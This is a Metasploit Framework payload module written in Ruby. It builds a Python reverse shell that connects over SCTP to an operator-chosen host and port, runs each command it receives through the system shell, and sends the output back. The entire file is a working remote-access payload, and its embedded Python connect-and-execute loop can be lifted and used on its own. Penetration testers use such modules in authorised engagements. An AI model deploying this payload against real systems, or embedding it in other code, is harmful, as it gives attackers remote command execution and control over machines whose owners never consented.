##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Command Shell, Reverse SCTP (via python)',
        'Description' => 'Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.6-2.7 and 3.4+.',
        'Author' => 'RageLtMan <rageltman[at]sempervictus>',
        'License' => MSF_LICENSE,
        'Platform' => 'python',
        'Arch' => ARCH_PYTHON,
        'Handler' => Msf::Handler::ReverseSctp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'python',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd = <<~PYTHON
      import socket as s
      import subprocess as r
      so=s.socket(s.AF_INET,s.SOCK_STREAM,132)
      so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
      while True:
        d=so.recv(1024)
        if len(d)==0:
          break
        p=r.Popen(d.decode('utf-8'),shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
        o=p.stdout.read()+p.stderr.read()
        try:
          so.send(o)
        except OSError as e:
          if e.errno != 22:
            raise
    PYTHON

    py_create_exec_stub(cmd)
  end
end
